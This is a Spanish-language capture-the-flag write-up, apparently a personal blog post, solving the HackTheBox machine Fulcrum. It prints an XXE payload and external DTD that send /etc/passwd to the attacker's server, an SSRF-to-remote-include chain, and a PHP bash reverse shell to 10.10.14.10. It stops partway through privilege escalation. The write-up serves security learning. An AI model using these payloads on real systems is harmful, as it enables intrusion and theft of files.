<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup HackTheBox Fulcrum</title>

  <meta name="description" content="Resolución de la máquina Fulcrum de la plataforma de HackTheBox">
  <meta name="author" content="DarthBear">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup HackTheBox Fulcrum">
  <meta name="twitter:description" content="Resolución de la máquina Fulcrum de la plataforma de HackTheBox">
  <meta name="twitter:creator" content="DarthBear">  
  <meta name="twitter:image" content="/images/hackthebox/fulcrum.png" />

  <meta property="og:site_name" content="DarthBear" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup HackTheBox Fulcrum">
  <meta property="og:description" content="Resolución de la máquina Fulcrum de la plataforma de HackTheBox">
  <meta property="og:image" content="/images/hackthebox/fulcrum.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/fulcrum.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Fulcrum" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="DarthBear">
          <h1 class="panel-cover__title panel-title scale-up-center">DarthBear</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/hackthebox" title="DarthBear" class="blog-button">HackTheBox</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/DarthBear" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/DarthBear" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/DarthBear" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@DarthBear" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:DarthBear@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#shell-www-data">Shell - www-data</a></li>
        <li><a href="#shell-root">Shell - root</a></li>
        <li><a href="#shell-webuser">Shell - webuser</a></li>
        <li><a href="#shell-btables">Shell - btables</a></li>
        <li><a href="#shell-923a">Shell - 923a</a></li>
        <li><a href="#shell-administrator">Shell - Administrator</a></li>
        <li><a href="#extra1-administrator">Extra 1 - Administrator</a></li>
        <li><a href="#extra2-administrator">Extra 2 - Administrator</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">HackTheBox</h4>
    <picture><img src="/images/hackthebox/fulcrum.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Fulcrum</h2><br>
  </header>
  
<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, y la mayoria parece corren un servicio <code class="language-plaintext highlighter-rouge">web</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">10.10.10.62
Nmap scan report for 10.10.10.62  
PORT      STATE SERVICE
4/tcp     open  unknown
22/tcp    open  ssh
80/tcp    open  http
88/tcp    open  kerberos-sec
9999/tcp  open  abyss
56423/tcp open  unknown</span>
</code></pre></div></div><br>

<p class="plain-text">Solo por comodidad agregaremos el dominio <code class="language-plaintext highlighter-rouge">fulcrum.htb</code> para no apuntar a la ip</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ echo </span><span class="am">"10.10.10.62 fulcrum.htb"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
</code></pre></div></div><br>

<p class="plain-text">Al abrir la pagina web del puerto <code class="language-plaintext highlighter-rouge">80</code> nos devuelve un error, lo interesante es si miramos el final de la pagina podemos ver <code class="language-plaintext highlighter-rouge">Microsoft .NET Framework 2.0</code></p>
<a href="/hackthebox/fulcrum/1.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/1.png"></p></div></a>

<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">88</code> corre un <code class="language-plaintext highlighter-rouge">phpMyAdmin</code> pero sin credenciales validas de poco nos sirve</p>
<a href="/hackthebox/fulcrum/2.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/2.png"></p></div></a>

<p class="plain-text">En el puerto <code class="language-plaintext highlighter-rouge">9999</code> podemos ver exactamente lo mismo que al inicio en el puerto <code class="language-plaintext highlighter-rouge">80</code></p>
<a href="/hackthebox/fulcrum/3.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/3.png"></p></div></a>

<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">4</code> nos dice que esta bajo <code class="language-plaintext highlighter-rouge">mantenimiento</code> y solo muestra un boton try again</p>
<a href="/hackthebox/fulcrum/4.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/4.png"></p></div></a>

<p class="plain-text">Al darle a <code class="language-plaintext highlighter-rouge">try again</code> nos redirige a <code class="language-plaintext highlighter-rouge">?page=home</code>, podriamos pensar en un <code class="language-plaintext highlighter-rouge">LFI</code> sin embargo despues de probar bastante con este puerto no llegamos a <code class="language-plaintext highlighter-rouge">nada</code></p>
<a href="/hackthebox/fulcrum/5.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/5.png"></p></div></a>

<p class="plain-text">Si vamos al puerto <code class="language-plaintext highlighter-rouge">56423</code> podemos ver que nos devuelve un <code class="language-plaintext highlighter-rouge">json</code> con una etiqueta <code class="language-plaintext highlighter-rouge">Heartbeat</code> que como valor tiene una etiqueta <code class="language-plaintext highlighter-rouge">Ping</code> que como valor tiene <code class="language-plaintext highlighter-rouge">Pong</code></p>
<a href="/hackthebox/fulcrum/6.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/6.png"></p></div></a>

<p class="plain-text">Podriamos intentar enviar la respuesta en <code class="language-plaintext highlighter-rouge">json</code> como input y ver si cambia algo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">{</span><span class="az">"Heartbeat"</span><span class="p">:{</span><span class="az">"Ping"</span><span class="p">:</span><span class="ve">"Pong"</span><span class="p">}}</span>
</code></pre></div></div><br>

<a href="/hackthebox/fulcrum/7.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/7.png"></p></div></a>

<p class="plain-text">Si se refleja el valor <code class="language-plaintext highlighter-rouge">Pong</code> podriamos intentar cambiarlo por <code class="language-plaintext highlighter-rouge">Ping</code>, sin embargo al hacerlo no funciona y recibimos la misma <code class="language-plaintext highlighter-rouge">respuesta</code> por parte del servidor</p>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">{</span><span class="az">"Heartbeat"</span><span class="p">:{</span><span class="az">"Ping"</span><span class="p">:</span><span class="ve">"Ping"</span><span class="p">}}</span>
</code></pre></div></div><br>

<a href="/hackthebox/fulcrum/9.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/9.png"></p></div></a>

<p class="plain-text">Despues de probar diferentes cosas al cambiar el <code class="language-plaintext highlighter-rouge">json</code> a una data en <code class="language-plaintext highlighter-rouge">xml</code> y enviar <code class="language-plaintext highlighter-rouge">Ping</code> como valor de la etiqueta <code class="language-plaintext highlighter-rouge">Ping</code> esta vez si se representa en la respuesta</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">&lt</span><span class="o">Heartbeat</span><span class="p">>&lt</span><span class="o">Ping</span><span class="p">>Ping&lt/</span><span class="o">Ping</span><span class="p">>&lt/</span><span class="o">Heartbeat</span><span class="p">></span>
</code></pre></div></div><br>

<a href="/hackthebox/fulcrum/10.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/10.png"></p></div></a>

</section>
<section class="post" id="shell-www-data">
<br><h3 class="post-title">Shell - www-data</h3><br>

<p class="plain-text">Sabemos que nos interpreta <code class="language-plaintext highlighter-rouge">xml</code>, despues de probar varios <code class="language-plaintext highlighter-rouge">XXE</code> no llegamos a nada reflejado en la respuesta, sin embargo podemos explotarlo <code class="language-plaintext highlighter-rouge">blind</code>, para esto en el <code class="language-plaintext highlighter-rouge">DOCTYPE</code> apuntaremos a una direccion con un <code class="language-plaintext highlighter-rouge">dtd</code> que es nuestro servidor</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">&lt!</span><span class="o">DOCTYPE </span><span class="p">replace </span><span class="no">SYSTEM</span><span class="s"> "http://10.10.14.10/pwned.dtd"</span><span class="p">>  
&lt</span><span class="o">data</span><span class="p">></span><span class="mi">&send;</span><span class="p">&lt/</span><span class="o">data</span><span class="p">></span>
</code></pre></div></div><br>

<a href="/hackthebox/fulcrum/11.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/11.png"></p></div></a>

<p class="plain-text">Al enviar esta data recibimos una petición en nuestro servidor al archivo <code class="language-plaintext highlighter-rouge">pwned.dtd</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.10.10.62 - - code 404, message File not found
10.10.10.62 - - "GET /pwned.dtd HTTP/1.0" 404 -</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora crearemos el <code class="language-plaintext highlighter-rouge">pwned.dtd</code>, para inciar definimos una entidad llamada <code class="language-plaintext highlighter-rouge">file</code> la cual valdra el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> en base64 ya que usaremos <code class="language-plaintext highlighter-rouge">wrappers</code> de php, despues de ello definimos una entidad <code class="language-plaintext highlighter-rouge">pwned</code> la cual se encargara de enviar el valor de <code class="language-plaintext highlighter-rouge">file</code> como peticion a nuestro servidor mediante el parametro <code class="language-plaintext highlighter-rouge">?file=</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">&lt!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">  
&lt!ENTITY % pwned "&lt!ENTITY send SYSTEM 'http://10.10.14.10/?file=%file;'>">
%pwned;</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos de nuevo la petición y al cargar el <code class="language-plaintext highlighter-rouge">pwned.dtd</code> e interpretarlo nos envia el contenido del archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> como peticion <code class="language-plaintext highlighter-rouge">GET</code> a nuestro servidor</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.62 - - "GET /pwned.dtd HTTP/1.0" 200 -
10.10.10.62 - - "GET /?file=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0" 200 -  </span>
</code></pre></div></div><br>

<p class="plain-text">Al decodear la data en <code class="language-plaintext highlighter-rouge">base64</code> podemos ver el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> completo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ base64</span><span class="p"> -d data.b64
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
libvirt-qemu:x:64055:108:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin
libvirt-dnsmasq:x:114:120:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/usr/sbin/nologin</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos leer archivos, aunque no podemos cargar el <code class="language-plaintext highlighter-rouge">config</code> de nginx podemos intentar adivinar el nombre del directorio donde esta la web que nos devuelve el <code class="language-plaintext highlighter-rouge">json</code>, al probar con <code class="language-plaintext highlighter-rouge">api</code> logramos cargar el index en <code class="language-plaintext highlighter-rouge">/var/www/api/index.php</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">&lt?php
	</span><span class="no">header</span><span class="p">(</span><span class="s">'Content-Type:application/json;charset=utf-8'</span><span class="p">);
	</span><span class="no">header</span><span class="p">(</span><span class="s">'Server: Fulcrum-API Beta'</span><span class="p">);
	</span><span class="no">libxml_disable_entity_loader</span><span class="p"> (</span><span class="mi">false</span><span class="p">);
	$xmlfile </span><span class="o">= </span><span class="no">file_get_contents</span><span class="p">(</span><span class="s">'php://input'</span><span class="p">);
	$dom </span><span class="o">= </span><span class="am">new </span><span class="na">DOMDocument</span><span class="p">();
	$dom->loadXML($xmlfile,</span><span class="no">LIBXML_NOENT</span><span class="o">|</span><span class="no">LIBXML_DTDLOAD</span><span class="p">);
	$input </span><span class="o">= </span><span class="no">simplexml_import_dom</span><span class="p">($dom);
	$output </span><span class="o">=</span><span class="p"> $input->Ping;
	</span><span class="c1">//check if ok
	</span><span class="o">if</span><span class="p">($output </span><span class="o">== </span><span class="s">"Ping"</span><span class="p">)
	{
		$data </span><span class="o">= array</span><span class="p">(</span><span class="s">'Heartbeat' </span><span class="o">=> array</span><span class="p">(</span><span class="s">'Ping'</span><span class="o"> => </span><span class="s">"Ping"</span><span class="p">));  
	}</span><span class="o">else</span><span class="p">{
		$data </span><span class="o">= array</span><span class="p">(</span><span class="s">'Heartbeat' </span><span class="o">=> array</span><span class="p">(</span><span class="s">'Ping'</span><span class="o"> => </span><span class="s">"Pong"</span><span class="p">));  
	}
	</span><span class="o">echo </span><span class="no">json_encode</span><span class="p">($data);
?></span>
</code></pre></div></div><br>

<p class="plain-text">Tambien podemos cargar el index del puerto <code class="language-plaintext highlighter-rouge">4</code> que se encuentra en <code class="language-plaintext highlighter-rouge">/var/www/uploads/index.php</code>, ahora podemos ver la razon por la que el <code class="language-plaintext highlighter-rouge">LFI</code> no funcionaba y es que si la direccion es diferente a <code class="language-plaintext highlighter-rouge">127.0.0.1</code> no usa include</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">&lt?php
</span><span class="o">if</span><span class="p">($_SERVER[</span><span class="s">'REMOTE_ADDR'</span><span class="p">] </span><span class="o">!= </span><span class="s">"127.0.0.1"</span><span class="p">)
{
	</span><span class="o">echo </span><span class="s">"&lth1>Under Maintance&lt/h1>&ltp>Please &lta href=</span><span class="mi">\"</span><span class="s">http://" </span><span class="o">. </span><span class="p">$_SERVER[</span><span class="s">'SERVER_ADDR'</span><span class="p">] </span><span class="o">.</span><span class="s"> ":4/index.php?page=home</span><span class="mi">\"</span><span class="s">>try again&lt/a> later.&lt/p>"</span><span class="p">;  
}</span><span class="o">else</span><span class="p">{
	$inc </span><span class="o">=</span><span class="p"> $_REQUEST[</span><span class="s">"page"</span><span class="p">];
	</span><span class="no">include</span><span class="p">($inc.</span><span class="s">".php"</span><span class="p">);
}
?></span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo podemos conseguir un <code class="language-plaintext highlighter-rouge">SSRF</code> ya que si desde el <code class="language-plaintext highlighter-rouge">XXE</code> apuntamos al puerto <code class="language-plaintext highlighter-rouge">4</code> el filtro para que la ip sea <code class="language-plaintext highlighter-rouge">127.0.0.1</code> hara un include de lo que le pasemos, probemos aplicar un <code class="language-plaintext highlighter-rouge">RFI</code> apuntando a un archivo <code class="language-plaintext highlighter-rouge">pwned</code> de nuestro servidor</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">&lt!</span><span class="o">DOCTYPE </span><span class="p">replace </span><span class="no">SYSTEM</span><span class="s"> "http://127.0.0.1:4/?page=http://10.10.14.10/pwned"</span><span class="p">>  </span>
</code></pre></div></div><br>

<a href="/hackthebox/fulcrum/12.png" target="_blank"><div><p><img src="/hackthebox/fulcrum/12.png"></p></div></a>

<p class="plain-text">Al enviar el <code class="language-plaintext highlighter-rouge">XML</code> y cargando <code class="language-plaintext highlighter-rouge">RFI</code> que apunta en nuestro servidor a un archivo <code class="language-plaintext highlighter-rouge">pwned</code> recibimos una peticion al archivo <code class="language-plaintext highlighter-rouge">pwned.php</code> ya que adjunta la string <code class="language-plaintext highlighter-rouge">.php</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.10.10.62 - - code 404, message File not found
10.10.10.62 - - "GET /pwned.php HTTP/1.0" 404 -</span>
</code></pre></div></div><br>

<p class="plain-text">Creamos el archivo <code class="language-plaintext highlighter-rouge">pwned.php</code> el cual mediante <code class="language-plaintext highlighter-rouge">system</code> enviara un simple <code class="language-plaintext highlighter-rouge">ping</code> a nuestro host, al enviar recibimos la petición a <code class="language-plaintext highlighter-rouge">pwned.php</code> y nos llega el <code class="language-plaintext highlighter-rouge">ping</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">&lt?php
    </span><span class="no">system</span><span class="p">(</span><span class="s">"ping -c1 10.10.14.10"</span><span class="p">);
?></span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.10.10.62 - - "GET /pwned.php HTTP/1.0" 200 -</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo tcpdump</span><span class="p"> -i tun0 -n icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
IP 10.10.14.10 > 10.10.10.62: ICMP echo request, id 53825, seq 1, length 64  
IP 10.10.10.62 > 10.10.10.62: ICMP echo reply, id 53825, seq 1, length 64
IP 10.10.10.62 > 10.10.10.62: ICMP echo request, id 1, seq 1, length 64
IP 10.10.14.10 > 10.10.10.62: ICMP echo reply, id 1, seq 1, length 64</span>
</code></pre></div></div><br>

<p class="plain-text">Ejecutamos comandos, basta con cambiar el ping por una <code class="language-plaintext highlighter-rouge">revshell</code> y es asi como mediante el <code class="language-plaintext highlighter-rouge">SSRF</code> que conseguimos a traves del <code class="language-plaintext highlighter-rouge">XXE</code> conseguimos cargar un archivo php aprovechando un <code class="language-plaintext highlighter-rouge">RFI</code> y conseguimos una shell como <code class="language-plaintext highlighter-rouge">www-data</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">&lt?php
    </span><span class="no">system</span><span class="p">(</span><span class="s">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span><span class="p">);  
?></span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.62
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~/uploads</span><span class="p">$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~/uploads</span><span class="p">$ hostname -I
10.10.10.62 192.168.122.1 
</span><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~/uploads</span><span class="p">$</span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-root">
<br><h3 class="post-title">Shell - root</h3><br>

<p class="plain-text">Aunque es innecesario y ni siquiera es una via intencionada al listar binarios con privilegios <code class="language-plaintext highlighter-rouge">suid</code> nos encontramos con el ya bastante famoso <code class="language-plaintext highlighter-rouge">pkexec</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">www-data@fulcrum</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null | grep -v snap  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
